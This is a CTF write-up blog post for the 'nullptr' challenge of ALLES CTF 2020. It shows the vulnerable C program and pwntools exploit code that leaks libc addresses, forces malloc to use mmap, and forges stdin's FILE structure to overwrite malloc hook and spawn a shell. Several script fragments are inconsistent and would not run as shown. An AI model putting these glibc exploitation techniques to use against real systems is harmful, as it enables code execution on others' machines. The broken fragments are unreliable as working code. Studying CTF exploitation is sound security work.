<!doctype html><html class="dark light"><head><meta charset=UTF-8><meta content="IE=edge" http-equiv=X-UA-Compatible><meta content="width=device-width,initial-scale=1.0" name=viewport><title>
         nullptr - ALLES CTF 2020
        
    </title><meta content="nullptr - ALLES CTF 2020" property=og:title><link href=https://pwnverse.github.io/fonts.css rel=stylesheet><script>(function(){var a=document.createElement('script');a.setAttribute('src','/js/imamu.js');a.setAttribute('data-website-id','74344cd8-1e87-4c38-8acd-f96049b8f07e');a.setAttribute('data-host-url','https:&#x2F;&#x2F;analytics.eu.umami.is');document.body.appendChild(a)})()</script><script async data-host-url=https://analytics.eu.umami.is data-website-id=74344cd8-1e87-4c38-8acd-f96049b8f07e src=/js/imamu.js></script><script async data-goatcounter=https://Cyb0rG.goatcounter.com/count src=https://pwnverse.github.io/js/count.js></script><noscript><img src="https://Cyb0rG.goatcounter.com//count?p=/posts/nullptr/&t=nullptr - ALLES CTF 2020"></noscript><link title="Cyb0rG's Home" href=https://pwnverse.github.io/atom.xml rel=alternate type=application/atom+xml><link href=https://pwnverse.github.io/theme/light.css rel=stylesheet><link href=https://pwnverse.github.io/theme/dark.css id=darkModeStyle rel=stylesheet><link href=https://pwnverse.github.io/main.css media=screen rel=stylesheet><body><div class=content><header><div class=main><a href=https://pwnverse.github.io>Cyb0rG's Home</a><div class=socials><a class=social href=https://twitter.com/_Cyb0rG rel=me> <img alt=twitter src=/social_icons/twitter.svg> </a><a class=social href=https://github.com/PwnVerse/ rel=me> <img alt=github src=/social_icons/github.svg> </a></div></div><nav><a href=/posts style=margin-left:.7em>/posts</a><a href=/projects style=margin-left:.7em>/projects</a><a href=/about style=margin-left:.7em>/about</a> | <a href=javascript:void(0) id=dark-mode-toggle onclick=toggleTheme()> <img id=sun-icon src=/feather/sun.svg style=filter:invert(1)> <img id=moon-icon src=/feather/moon.svg> </a><script src=https://pwnverse.github.io/js/themetoggle.js></script></nav></header><main><article><div class=title><div class=page-header>nullptr - ALLES CTF 2020<span class=primary-color style=font-size:1.6em>.</span></div><div class=meta>Posted on <time>2020-09-09</time></div></div><section class=body><p><strong>tl;dr</strong><ul><li>Overwrite <code>mmap_threshold</code> with null and trim top chunk size.<li>Null out last 2 bytes of stdin's <code>_IO_buf_base</code> and brute force to get allocation on stdin.<li>Overwrite one of the jump tables with win function to get shell.</ul><p><strong>Challenge Points:</strong> 453 **Solves: ** 4<p>We had a really great time this weekend with this year's edition of Alles CTF. I spent most of my time working on the challenge nullptr and in this post , I'll be discussing the intended solution for the challenge.<p><strong>PS:</strong> We could not solve this during the CTF but the exploit idea is worth sharing.<h2 id=challenge-description>Challenge description</h2><p>To begin with , we'd been provided with a pretty simple c source code which has 2 functionalities.<pre class=language-c data-lang=c style=background:#0f1419;color:#bfbab0><code class=language-c data-lang=c><span style=color:#ff7733>#include </span><span style=color:#c2d94c>&LTstdio.h>
</span><span style=color:#ff7733>#include </span><span style=color:#c2d94c>&LTstdlib.h>
</span><span style=color:#ff7733>#include </span><span style=color:#c2d94c>&LTunistd.h>
</span><span>
</span><span style=color:#ff7733>void </span><span style=color:#ffb454>get_me_out_of_this_mess</span><span>() { </span><span style=color:#ffb454>execl</span><span>(</span><span style=color:#c2d94c>"/bin/sh"</span><span style=color:#bfbab0cc>, </span><span style=color:#c2d94c>"sh"</span><span style=color:#bfbab0cc>, </span><span style=color:#f29718>NULL</span><span>)</span><span style=color:#bfbab0cc>; </span><span>}
</span><span>
</span><span style=color:#ff7733>int </span><span style=color:#ffb454>main</span><span>(</span><span style=color:#ff7733>void</span><span>) {
</span><span>    </span><span style=color:#ff7733>unsigned long</span><span> addr</span><span style=color:#bfbab0cc>;
</span><span>    </span><span style=color:#ff7733>int</span><span> menuchoice</span><span style=color:#bfbab0cc>;
</span><span>    </span><span style=color:#ff7733>while </span><span>(</span><span style=color:#f29718>1</span><span>) {
</span><span>        </span><span style=color:#f07178>printf</span><span>(</span><span style=color:#c2d94c>"[1. view, 2. null, -1. exit]> </span><span style=color:#95e6cb>\n</span><span style=color:#c2d94c>"</span><span>)</span><span style=color:#bfbab0cc>; </span><span style=color:#f07178>fflush</span><span>(stdout)</span><span style=color:#bfbab0cc>;
</span><span>        </span><span style=color:#f07178>scanf</span><span>(</span><span style=color:#c2d94c>"</span><span style=color:#f29718>%d</span><span style=color:#c2d94c>"</span><span style=color:#bfbab0cc>, </span><span style=color:#f29668>&</span><span>menuchoice)</span><span style=color:#bfbab0cc>; </span><span style=color:#f07178>getc</span><span>(stdin)</span><span style=color:#bfbab0cc>;
</span><span>        </span><span style=color:#ff7733>switch </span><span>(menuchoice) {
</span><span>        </span><span style=color:#ff7733>case </span><span style=color:#f29718>1</span><span style=color:#bfbab0cc>:
</span><span>            </span><span style=color:#f07178>printf</span><span>(</span><span style=color:#c2d94c>"view address> </span><span style=color:#95e6cb>\n</span><span style=color:#c2d94c>"</span><span>)</span><span style=color:#bfbab0cc>; </span><span style=color:#f07178>fflush</span><span>(stdout)</span><span style=color:#bfbab0cc>;
</span><span>            </span><span style=color:#f07178>scanf</span><span>(</span><span style=color:#c2d94c>"</span><span style=color:#f29718>%lu</span><span style=color:#c2d94c>"</span><span style=color:#bfbab0cc>, </span><span style=color:#f29668>&</span><span>addr)</span><span style=color:#bfbab0cc>; </span><span style=color:#f07178>getc</span><span>(stdin)</span><span style=color:#bfbab0cc>;
</span><span>            </span><span style=color:#f07178>printf</span><span>(</span><span style=color:#c2d94c>"</span><span style=color:#f29718>%p</span><span style=color:#c2d94c>: </span><span style=color:#f29718>%p</span><span style=color:#95e6cb>\n</span><span style=color:#c2d94c>"</span><span style=color:#bfbab0cc>,</span><span> addr</span><span style=color:#bfbab0cc>, </span><span style=color:#f29668>*</span><span>(</span><span style=color:#ff7733>void</span><span style=color:#f29668>**</span><span>)addr)</span><span style=color:#bfbab0cc>;
</span><span>            </span><span style=color:#ff7733>break</span><span style=color:#bfbab0cc>;
</span><span>        </span><span style=color:#ff7733>case </span><span style=color:#f29718>2</span><span style=color:#bfbab0cc>:
</span><span>            </span><span style=color:#f07178>printf</span><span>(</span><span style=color:#c2d94c>"nuke address> </span><span style=color:#95e6cb>\n</span><span style=color:#c2d94c>"</span><span>)</span><span style=color:#bfbab0cc>; </span><span style=color:#f07178>fflush</span><span>(stdout)</span><span style=color:#bfbab0cc>;
</span><span>            </span><span style=color:#f07178>scanf</span><span>(</span><span style=color:#c2d94c>"</span><span style=color:#f29718>%lu</span><span style=color:#c2d94c>"</span><span style=color:#bfbab0cc>, </span><span style=color:#f29668>&</span><span>addr)</span><span style=color:#bfbab0cc>; </span><span style=color:#f07178>getc</span><span>(stdin)</span><span style=color:#bfbab0cc>;
</span><span>            </span><span style=color:#f29668>*</span><span>(</span><span style=color:#ff7733>void</span><span style=color:#f29668>**</span><span>)addr </span><span style=color:#f29668>= </span><span style=color:#f29718>NULL</span><span style=color:#bfbab0cc>;
</span><span>            </span><span style=color:#f07178>printf</span><span>(</span><span style=color:#c2d94c>"ok!</span><span style=color:#95e6cb>\n</span><span style=color:#c2d94c>"</span><span>)</span><span style=color:#bfbab0cc>;
</span><span>            </span><span style=color:#ff7733>break</span><span style=color:#bfbab0cc>;
</span><span>        </span><span style=color:#ff7733>case </span><span style=color:#f29668>-</span><span style=color:#f29718>1</span><span style=color:#bfbab0cc>:
</span><span>            </span><span style=color:#f07178>printf</span><span>(</span><span style=color:#c2d94c>"bye!</span><span style=color:#95e6cb>\n</span><span style=color:#c2d94c>"</span><span>)</span><span style=color:#bfbab0cc>;
</span><span>            </span><span style=color:#ff7733>return </span><span style=color:#f29718>1</span><span style=color:#bfbab0cc>;
</span><span>        </span><span style=color:#ff7733>default</span><span style=color:#bfbab0cc>:;
</span><span>        }
</span><span>    }
</span><span>    </span><span style=color:#ff7733>return </span><span style=color:#f29718>0</span><span style=color:#bfbab0cc>;
</span><span>}
</span><span>
</span></code></pre><ol><li>The view function prints the content of an address passed , hence we can be assured of all leaks ;).<li>The nuke function nulls out the content of an address passed.</ol><p>Looks pretty simple doesn't it?<h2 id=getting-necessary-leaks>Getting necessary leaks</h2><p>Getting all required leaks is nothing but a trivial task.<p>Initially, we can directly get stack leak by passing any <code>non-numeric</code> value to scanf. Let's script it a bit.<pre class=language-py data-lang=py style=background:#0f1419;color:#bfbab0><code class=language-py data-lang=py><span>
</span><span style=color:#ff7733>from </span><span>pwn </span><span style=color:#ff7733>import </span><span style=color:#f29718>*
</span><span style=color:#ff7733>import </span><span>sys
</span><span>
</span><span>HOST </span><span style=color:#f29668>= </span><span style=color:#c2d94c>'dwadwda'
</span><span>PORT </span><span style=color:#f29668>= </span><span style=color:#f29718>123
</span><span>LIBC </span><span style=color:#f29668>= </span><span style=color:#ffb454>ELF</span><span>(</span><span style=color:#c2d94c>"./libc.so.6"</span><span style=color:#bfbab0cc>,</span><span style=color:#f29718>checksec </span><span style=color:#f29668>= </span><span style=color:#f29718>False</span><span>)
</span><span style=color:#ff7733>while </span><span style=color:#f29718>True</span><span>:
</span><span>    </span><span style=color:#ff7733>if</span><span>(</span><span style=color:#f07178>len</span><span>(sys</span><span style=color:#f29668>.</span><span>argv)</span><span style=color:#f29668>></span><span style=color:#f29718>1</span><span>):
</span><span>        io</span><span style=color:#f29668>=</span><span style=color:#ffb454>remote</span><span>(HOST</span><span style=color:#bfbab0cc>,</span><span>PORT)
</span><span>        context</span><span style=color:#f29668>.</span><span>noptrace</span><span style=color:#f29668>=</span><span style=color:#f29718>True
</span><span>    </span><span style=color:#ff7733>else</span><span>:
</span><span>        io</span><span style=color:#f29668>=</span><span style=color:#ffb454>process</span><span>(</span><span style=color:#c2d94c>'./nullptr'</span><span style=color:#bfbab0cc>,</span><span style=color:#f29718>env </span><span style=color:#f29668>= </span><span>{</span><span style=color:#c2d94c>"LD_PRELOAD" </span><span style=color:#bfbab0cc>: </span><span style=color:#c2d94c>"./libc.so.6"</span><span>})
</span><span>
</span><span>    reu </span><span style=color:#f29668>= </span><span style=color:#ff7733>lambda </span><span style=color:#f29718>a </span><span>: io</span><span style=color:#f29668>.</span><span style=color:#ffb454>recvuntil</span><span>(a)
</span><span>    sla </span><span style=color:#f29668>= </span><span style=color:#ff7733>lambda </span><span style=color:#f29718>a</span><span style=color:#bfbab0cc>,</span><span style=color:#f29718>b </span><span>: io</span><span style=color:#f29668>.</span><span style=color:#ffb454>sendlineafter</span><span>(a</span><span style=color:#bfbab0cc>,</span><span>b)
</span><span>    sl </span><span style=color:#f29668>= </span><span style=color:#ff7733>lambda </span><span style=color:#f29718>a </span><span>: io</span><span style=color:#f29668>.</span><span style=color:#ffb454>sendline</span><span>(a)
</span><span>    rel </span><span style=color:#f29668>= </span><span style=color:#ff7733>lambda </span><span>: io</span><span style=color:#f29668>.</span><span style=color:#ffb454>recvline</span><span>()
</span><span>    sa </span><span style=color:#f29668>= </span><span style=color:#ff7733>lambda </span><span style=color:#f29718>a</span><span style=color:#bfbab0cc>,</span><span style=color:#f29718>b </span><span>: io</span><span style=color:#f29668>.</span><span style=color:#ffb454>sendafter</span><span>(a</span><span style=color:#bfbab0cc>,</span><span>b)
</span><span>    re </span><span style=color:#f29668>= </span><span style=color:#ff7733>lambda </span><span style=color:#f29718>a </span><span>: io</span><span style=color:#f29668>.</span><span style=color:#ffb454>recv</span><span>(a)
</span><span>    s </span><span style=color:#f29668>= </span><span style=color:#ff7733>lambda </span><span style=color:#f29718>a </span><span>: io</span><span style=color:#f29668>.</span><span style=color:#ffb454>send</span><span>(a)
</span><span>
</span><span>    </span><span style=color:#ff7733>def </span><span style=color:#ffb454>null</span><span>(</span><span style=color:#f29718>addr</span><span>):
</span><span>        </span><span style=color:#ffb454>sla</span><span>(</span><span style=color:#c2d94c>']> </span><span style=color:#95e6cb>\n</span><span style=color:#c2d94c>'</span><span style=color:#bfbab0cc>,</span><span style=color:#c2d94c>'2'</span><span>)
</span><span>        </span><span style=color:#ffb454>sla</span><span>(</span><span style=color:#c2d94c>'nuke address> </span><span style=color:#95e6cb>\n</span><span style=color:#c2d94c>'</span><span style=color:#bfbab0cc>,</span><span style=font-style:italic;color:#39bae6>str</span><span>(addr))
</span><span>
</span><span>    </span><span style=color:#ff7733>def </span><span style=color:#ffb454>malloc</span><span>(</span><span style=color:#f29718>libc</span><span>):
</span><span>        base </span><span style=color:#f29668>= </span><span>libc </span><span style=color:#f29668>+ </span><span style=color:#f29718>0x1ea9b8
</span><span>        </span><span style=color:#ffb454>null</span><span>(base)
</span><span>
</span><span>    </span><span style=color:#ff7733>if </span><span>__name__</span><span style=color:#f29668>==</span><span style=color:#c2d94c>"__main__"</span><span>:
</span><span>        </span><span style=color:#ffb454>sla</span><span>(</span><span style=color:#c2d94c>']> </span><span style=color:#95e6cb>\n</span><span style=color:#c2d94c>'</span><span style=color:#bfbab0cc>,</span><span style=color:#c2d94c>'1'</span><span>)
</span><span>        </span><span style=color:#ffb454>reu</span><span>(</span><span style=color:#c2d94c>'address> </span><span style=color:#95e6cb>\n</span><span style=color:#c2d94c>'</span><span>)
</span><span>        </span><span style=color:#ffb454>s</span><span>(</span><span style=color:#ffb454>p8</span><span>(</span><span style=color:#f29718>1</span><span>))
</span><span>        stack </span><span style=color:#f29668>= </span><span style=font-style:italic;color:#39bae6>int</span><span>(</span><span style=color:#ffb454>re</span><span>(</span><span style=color:#f29718>14</span><span>)</span><span style=color:#bfbab0cc>,</span><span style=color:#f29718>16</span><span>)
</span><span>        libc </span><span style=color:#f29668>= </span><span style=color:#ffb454>getdata</span><span>(stack</span><span style=color:#f29668>-</span><span style=color:#f29718>0xd8</span><span>) </span><span style=color:#f29668>- </span><span style=color:#f29718>0x271e3
</span><span>        code </span><span style=color:#f29668>= </span><span style=color:#ffb454>getdata</span><span>(stack</span><span style=color:#f29668>-</span><span style=color:#f29718>0x18</span><span>) </span><span style=color:#f29668>- </span><span style=color:#f29718>0x10ce
</span><span>        log</span><span style=color:#f29668>.</span><span style=color:#ffb454>info</span><span>(</span><span style=color:#c2d94c>'stack = ' </span><span style=color:#f29668>+ </span><span style=color:#f07178>hex</span><span>(stack))
</span><span>        log</span><span style=color:#f29668>.</span><span style=color:#ffb454>info</span><span>(</span><span style=color:#c2d94c>'libc = ' </span><span style=color:#f29668>+ </span><span style=color:#f07178>hex</span><span>(libc))
</span><span>        log</span><span style=color:#f29668>.</span><span style=color:#ffb454>info</span><span>(</span><span style=color:#c2d94c>'code = ' </span><span style=color:#f29668>+ </span><span style=color:#f07178>hex</span><span>(code))
</span></code></pre><h2 id=idea-of-exploitation>Idea of exploitation</h2><p>After carefully analyzing scanf's source code, sherl0ck came up with the idea of calling <strong>malloc</strong> again by <code>nulling</code> out <code>IO_buf_base</code>.<p>In the depths of scanf ,there resides a function called IO_doallocbuf.<pre class=language-c data-lang=c style=background:#0f1419;color:#bfbab0><code class=language-c data-lang=c><span>  </span><span style=color:#ff7733>if </span><span>(fp</span><span style=color:#f29668>-></span><span>_IO_buf_base </span><span style=color:#f29668>== </span><span style=color:#f29718>NULL</span><span>)
</span><span>    {
</span><span>      </span><span style=font-style:italic;color:#5c6773>/* Maybe we already have a push back pointer.  */
</span><span>      </span><span style=color:#ff7733>if </span><span>(fp</span><span style=color:#f29668>-></span><span>_IO_save_base </span><span style=color:#f29668>!= </span><span style=color:#f29718>NULL</span><span>)
</span><span>	{
</span><span>	  </span><span style=color:#f07178>free </span><span>(fp</span><span style=color:#f29668>-></span><span>_IO_save_base)</span><span style=color:#bfbab0cc>;
</span><span>	  fp</span><span style=color:#f29668>-></span><span>_flags </span><span style=color:#f29668>&= ~</span><span>_IO_IN_BACKUP</span><span style=color:#bfbab0cc>;
</span><span>	}
</span><span>      </span><span style=color:#ffb454>_IO_doallocbuf </span><span>(fp)</span><span style=color:#bfbab0cc>;
</span><span>    }
</span><span>
</span></code></pre><p>The code is actually of the caller function of <code>_IO_doallocbuf</code> which is <code>_IO_new_file_underflow</code>.<p>It calls malloc with a fixed size of <code>blk_sizet</code> which is by default 0x1000 bytes.<p>From this point on , we were stuck , we tried nulling out the last 2 bytes of buf base in the hope of getting allocation at tcache structure , from there on we faked a 0x400 size arbitrary chunk in tcache and found another way to call malloc with size of 0x400 from stdout structure.<p>Well , getting allocation with stdout doesn't actually give us arbitrary write.<h2 id=the-intended-solution>The intended solution</h2><p>Well , the intended solution is actually leveraging an mmap call from malloc. Let's see how this can be done.<ul><li>Nulling out <code>mmap_threshold</code> with triggers a different code path in malloc.<li>Also , trimming top size by writing null misaligned finally calls mmap when malloc is invoked.</ul><p>Now , all that we have to do is , brute force until an mmap happens near our stdin file structure and from there on , its a game over.<p>Let's take our script forward.<pre class=language-py data-lang=py style=background:#0f1419;color:#bfbab0><code class=language-py data-lang=py><span>        buf_base </span><span style=color:#f29668>= </span><span>libc </span><span style=color:#f29668>+ </span><span style=color:#f29718>0x1ea9b8
</span><span>        input_buffer </span><span style=color:#f29668>= </span><span style=color:#ffb454>getdata</span><span>(buf_base)
</span><span>        TARGET_REGION </span><span style=color:#f29668>= </span><span>libc </span><span style=color:#f29668>+ </span><span style=color:#f29718>0x1ea000
</span><span>        TARGET_HOOK_OFFSET </span><span style=color:#f29668>= </span><span style=color:#f29718>0xb70
</span><span>        TARGET_STDIN_OFFSET </span><span style=color:#f29668>= </span><span style=color:#f29718>0x980
</span><span>        _IO_2_1_stdin_ </span><span style=color:#f29668>= </span><span>libc </span><span style=color:#f29668>+ </span><span>LIBC</span><span style=color:#f29668>.</span><span>symbols[</span><span style=color:#c2d94c>'_IO_2_1_stdin_'</span><span>]
</span><span>        mmap_threshold_ </span><span style=color:#f29668>= </span><span>libc </span><span style=color:#f29668>+ </span><span style=color:#f29718>0x1ea280
</span><span>        MAIN_ARENA_TOP_CHUNK_PTR </span><span style=color:#f29668>= </span><span>libc_base </span><span style=color:#f29668>+ </span><span style=color:#f29718>0x1eabe0
</span><span>        top_chunk </span><span style=color:#f29668>= </span><span style=color:#ffb454>getdata</span><span>(MAIN_ARENA_TOP_CHUNK_PTR </span><span style=color:#f29668>+ </span><span style=color:#f29718>8</span><span>)
</span><span>        _IO_stdfile_0_lock </span><span style=color:#f29668>= </span><span>libc_base </span><span style=color:#f29668>+ </span><span style=color:#f29718>0x1ed4d0
</span><span>        __GI__IO_file_jumps </span><span style=color:#f29668>= </span><span>libc_base </span><span style=color:#f29668>+ </span><span style=color:#f29718>0x1ec4a0
</span><span>        MASK </span><span style=color:#f29668>= </span><span style=color:#f29718>0xffffffffffff0000
</span><span>        </span><span style=color:#ff7733>if </span><span>TARGET_REGION </span><span style=color:#f29668>& </span><span>MASK </span><span style=color:#f29668>!= </span><span>TARGET_REGION:
</span><span>            log</span><span style=color:#f29668>.</span><span style=color:#ffb454>failure</span><span>(</span><span style=color:#c2d94c>"Restart exploit"</span><span>)
</span><span>            io</span><span style=color:#f29668>.</span><span style=color:#ffb454>close</span><span>()
</span><span>        </span><span style=color:#ff7733>continue
</span><span>        </span><span style=color:#ff7733>else</span><span>:
</span><span>            </span><span style=color:#ff7733>break
</span><span>       </span><span style=font-style:italic;color:#5c6773>#Null out top chunk partially keeping the inuse bit
</span><span>       </span><span style=font-style:italic;color:#5c6773>#Null out mmap_threshold and next malloc should call mmap
</span><span>       </span><span style=color:#ffb454>null</span><span>(mmap_threshold </span><span style=color:#f29668>+ </span><span style=color:#f29718>16</span><span>) 
</span><span>       </span><span style=color:#ffb454>null</span><span>(top_chunk </span><span style=color:#f29668>+ </span><span style=color:#f29718>8 </span><span style=color:#f29668>+ </span><span style=color:#f29718>1</span><span>)
</span><span>
</span><span>       </span><span style=font-style:italic;color:#5c6773># malloc will now be mmap!
</span><span>       </span><span style=font-style:italic;color:#5c6773># We keep calling mmap from malloc and bruteforce for getting allocation at stdin
</span><span>       </span><span style=color:#ff7733>for </span><span style=font-style:italic;color:#39bae6>_ </span><span style=color:#ff7733>in </span><span style=color:#f07178>range</span><span>(</span><span style=color:#f29718>200</span><span>):
</span><span>           </span><span style=color:#ffb454>malloc</span><span>(libc)
</span><span>           input_buffer </span><span style=color:#f29668>= </span><span style=color:#ffb454>getdata</span><span>(_IO_2_1_stdin_ </span><span style=color:#f29668>+ </span><span style=color:#f29718>8 </span><span style=color:#f29668>* </span><span style=color:#f29718>3</span><span>)
</span><span>           </span><span style=color:#ff7733>if </span><span>(input_buffer </span><span style=color:#f29668>& </span><span>MASK) </span><span style=color:#f29668>== </span><span>TARGET_REGION:
</span><span>               log</span><span style=color:#f29668>.</span><span style=color:#ffb454>success</span><span>(</span><span style=color:#c2d94c>'Hit'</span><span>)
</span><span>               </span><span style=color:#ff7733>break
</span><span>
</span><span>      
</span></code></pre><p>Once there's a hit , all that's left is to partially overwrite <code>IO_buf_base</code> and get allocation on stdin. Here , after getting allocation on stdin , we intend to overwrite malloc hook to get shell.<pre class=language-py data-lang=py style=background:#0f1419;color:#bfbab0><code class=language-py data-lang=py><span>        </span><span style=font-style:italic;color:#5c6773>#Now we partially overwrite io buf base of stdin
</span><span>        </span><span style=color:#ffb454>null</span><span>(_IO_2_1_stdin_ </span><span style=color:#f29668>+ </span><span style=color:#f29718>8</span><span style=color:#f29668>*</span><span style=color:#f29718>7 </span><span style=color:#f29668>- </span><span style=color:#f29718>6</span><span>)
</span><span>        _s </span><span style=color:#f29668>= </span><span>TARGET_STDIN_OFFSET
</span><span>        data </span><span style=color:#f29668>= </span><span style=color:#ffb454>p64</span><span>(</span><span style=color:#f29718>0xfbad2088</span><span>) </span><span style=color:#f29668>+ </span><span style=color:#ffb454>p64</span><span>(TARGET_REGION)</span><span style=color:#f29668>*</span><span style=color:#f29718>6 </span><span style=color:#f29668>+ </span><span style=color:#ffb454>p64</span><span>(</span><span style=color:#f29718>0</span><span>)</span><span style=color:#f29668>*</span><span style=color:#f29718>5 </span><span style=color:#f29668>+ </span><span style=color:#ffb454>p64</span><span>(</span><span style=color:#f29718>0</span><span>) </span><span style=color:#f29668>+ </span><span style=color:#ffb454>p8</span><span>(</span><span style=color:#f29718>0</span><span>) </span><span style=color:#f29668>+ </span><span style=color:#ffb454>p64</span><span>(_IO_stdfile_0_lock) </span><span style=color:#f29668>+ </span><span style=color:#ffb454>p32</span><span>(</span><span style=color:#f29718>0</span><span>) </span><span style=color:#f29668>+ </span><span style=color:#ffb454>p64</span><span>(__GI__IO_file_jumps)
</span><span>        data </span><span style=color:#f29668>= </span><span>data</span><span style=color:#f29668>.</span><span style=color:#ffb454>ljust</span><span>(TARGET_HOOK_OFFSET</span><span style=color:#bfbab0cc>,</span><span style=color:#c2d94c>'x'</span><span>)
</span><span>
</span><span>        </span><span style=color:#ffb454>sla</span><span>(data)
</span><span>        </span><span style=font-style:italic;color:#5c6773>#overwritten malloc hook
</span><span>        </span><span style=font-style:italic;color:#5c6773>#call malloc to get shell
</span><span>        </span><span style=color:#ffb454>malloc</span><span>(libc)
</span><span>        io</span><span style=color:#f29668>.</span><span style=color:#ffb454>interactive</span><span>()
</span><span>
</span></code></pre><h3 id=an-alternative-approach>An alternative approach</h3><p>We could be all lazy and let brute force do the work. A simpler yet time consuming approach would be to overwrite the last 3 bytes of stdin's <code>IO_buf_base</code> and wait for the magic to happen. Eventually , in one of the runs , it would match with binary bss and you get a direct write to GOT table.<h2 id=conclusion>Conclusion</h2><p>The challenge had really intersting concepts involved and we learnt quite alot. Kudos to the author Mrmaxmeier for the awesome challenge.<p>Here's the original script of the author - <a href=https://gist.github.com/Mrmaxmeier/830561d4a732b0af24bf29d685a9f74f>Link</a></section></article></main></div>